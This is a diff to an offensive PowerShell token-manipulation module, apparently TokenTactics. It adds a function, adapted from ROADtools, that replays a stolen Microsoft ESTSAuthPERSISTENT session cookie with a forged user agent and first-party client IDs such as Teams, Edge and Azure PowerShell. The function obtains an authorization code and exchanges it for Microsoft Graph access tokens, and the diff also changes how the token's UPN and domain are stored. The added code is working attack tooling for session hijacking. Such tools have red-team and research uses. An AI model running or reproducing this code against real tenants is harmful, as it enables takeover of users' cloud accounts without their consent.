@@ -199,10 +199,142 @@ function Get-AzureToken {
             $jwt = $response.access_token
 
             $output = ConvertFrom-JWTtoken -token $jwt
-            $global:upn = $output.upn
-            Write-Output $upn
+            $global:TokenDomain = $output.upn -split '@' | Select-Object -Last 1
+            $global:TokenUpn = $output.upn
             break
         }
+    }
+}
+
+function Get-AzureTokenFromESTSCookie {
+
+    <#
+    .DESCRIPTION
+        Authenticate to an application (default graph.microsoft.com) using Authorization Code flow.
+        Authenticates to MSGraph as Teams FOCI client by default.
+        https://learn.microsoft.com/en-us/azure/active-directory/develop/v2-oauth2-auth-code-flow
+
+    .EXAMPLE
+        Get-AzureTokenFromESTSCookie -Client MSTeams -ESTSAuthCookie "0.AbcAp.."
+
+    .AUTHOR
+        Adapted for PowerShell by https://github.com/rotarydrone from ROADtools by https://github.com/dirkjanm
+        https://github.com/rvrsh3ll/TokenTactics/pull/9
+        https://github.com/dirkjanm/ROADtools/wiki/ROADtools-Token-eXchange-(roadtx)#selenium-based-authentication
+    #>
+
+    [cmdletbinding()]
+    Param(
+        [Parameter(Mandatory = $True)]
+        [String[]]
+        $ESTSAuthCookie,
+        [Parameter(Mandatory = $False)]
+        [String[]]
+        [ValidateSet("MSTeams", "MSEdge", "AzurePowershell")]
+        $Client = "MSTeams",
+        [Parameter(Mandatory = $False)]
+        [String]
+        $Resource = "https://graph.microsoft.com/",
+        [Parameter(Mandatory = $False)]
+        [ValidateSet('Mac', 'Windows', 'AndroidMobile', 'iPhone')]
+        [String]$Device,
+        [Parameter(Mandatory = $False)]
+        [ValidateSet('Android', 'IE', 'Chrome', 'Firefox', 'Edge', 'Safari')]
+        [String]$Browser
+    )
+
+    if ($Device) {
+        if ($Browser) {
+            $UserAgent = Get-ForgedUserAgent -Device $Device -Browser $Browser
+        } else {
+            $UserAgent = Get-ForgedUserAgent -Device $Device
+        }
+    } else {
+        if ($Browser) {
+            $UserAgent = Get-ForgedUserAgent -Browser $Browser
+        } else {
+            $UserAgent = Get-ForgedUserAgent
+        }
+    }
+
+
+    if ($Client -eq "MSTeams") {
+        $client_id = "1fec8e78-bce4-4aaf-ab1b-5451cc387264"
+    } elseif ($Client -eq "MSEdge") {
+        $client_id = "ecd6b820-32c2-49b6-98a6-444530e5a77a"
+    } elseif ($Client -eq "AzurePowershell") {
+        $client_id = "1950a258-227b-4e31-a9cf-717495945fc2"
+    }
+
+    $Headers = @{}
+    $Headers["User-Agent"] = $UserAgent
+
+    $session = [Microsoft.PowerShell.Commands.WebRequestSession]::new()
+    $cookie = [System.Net.Cookie]::new("ESTSAuthPERSISTENT", "$($ESTSAuthCookie)")
+    $session.Cookies.Add('https://login.microsoftonline.com/', $cookie)
+
+    $state = [System.Guid]::NewGuid().ToString()
+    $redirect_uri = ([System.Uri]::EscapeDataString("https://login.microsoftonline.com/common/oauth2/nativeclient"))
+
+    # Get the authorization code from the STS
+    if ($PSVersionTable.PSEdition -ne "Core") {
+        $sts_response = Invoke-WebRequest -UseBasicParsing -MaximumRedirection 0 -ErrorAction SilentlyContinue -WebSession $session -Method Get -Uri "https://login.microsoftonline.com/common/oauth2/authorize?response_type=code&client_id=$($client_id)&resource=$($Resource)&redirect_uri=$($redirect_uri)&state=$($state)" -Headers $Headers
+    } else {
+        $sts_response = Invoke-WebRequest -UseBasicParsing -SkipHttpErrorCheck -MaximumRedirection 0 -ErrorAction SilentlyContinue -WebSession $session -Method Get -Uri "https://login.microsoftonline.com/common/oauth2/authorize?response_type=code&client_id=$($client_id)&resource=$($Resource)&redirect_uri=$($redirect_uri)&state=$($state)" -Headers $Headers
+    }
+
+    if ($sts_response.StatusCode -eq 302) {
+
+        if ($PSVersionTable.PSEdition -ne "Core") {
+            $uri = [System.Uri]$sts_response.Headers.Location
+        } else {
+            $uri = [System.Uri]$sts_response.Headers.Location[0]
+        }
+
+        # Get the parameters from the redirect URI and build a hashtable containing the different parameters
+        $query = $uri.Query.TrimStart('?')
+        $queryParams = @{}
+        $paramPairs = $query.Split('&')
+
+        foreach ($pair in $paramPairs) {
+            $parts = $pair.Split('=')
+            $key = $parts[0]
+            $value = $parts[1]
+            $queryParams[$key] = $value
+        }
+        # When code is present, we have a valid refresh token and can use it to request a new token
+        if ($queryParams.ContainsKey('code')) {
+            $refreshToken = $queryParams['code']
+        } else {
+            Write-Host "[-] Code not found in redirected URL path"
+            Write-Host "    Requested URL: https://login.microsoftonline.com/common/oauth2/authorize?response_type=code&client_id=$($client_id)&resource=$($Resource)&redirect_uri=$($redirect_uri)&state=$($state)"
+            Write-Host "    Response Code: $($sts_response.StatusCode)"
+            Write-Host "    Response URI:  $($sts_response.Headers.Location)"
+            return
+        }
+    } else {
+        Write-Host "[-] Expected 302 redirect but received other status"
+        Write-Host "    Requested URL: https://login.microsoftonline.com/common/oauth2/authorize?response_type=code&client_id=$($client_id)&resource=$($Resource)&redirect_uri=$($redirect_uri)&state=$($state)"
+        Write-Host "    Response Code: $($sts_response.StatusCode)"
+        Write-Host "[-] The request may require user interation to complete, or the provided cookie is invalid"
+        return
+    }
+
+    if ($refreshToken) {
+
+        $body = @{
+            "resource"     = $Resource
+            "client_id"    = $client_id
+            "grant_type"   = "authorization_code"
+            "redirect_uri" = "https://login.microsoftonline.com/common/oauth2/nativeclient"
+            "code"         = $refreshToken
+            "scope"        = "openid"
+        }
+
+        $global:response = Invoke-RestMethod -UseBasicParsing -Method Post -Uri "https://login.microsoftonline.com/common/oauth2/token" -Headers $Headers -Body $body
+        $output = ConvertFrom-JWTtoken -token $response.access_token
+        $global:TokenDomain = $output.upn -split '@' | Select-Object -Last 1
+        $global:TokenUpn = $output.upn
     }
 }
 
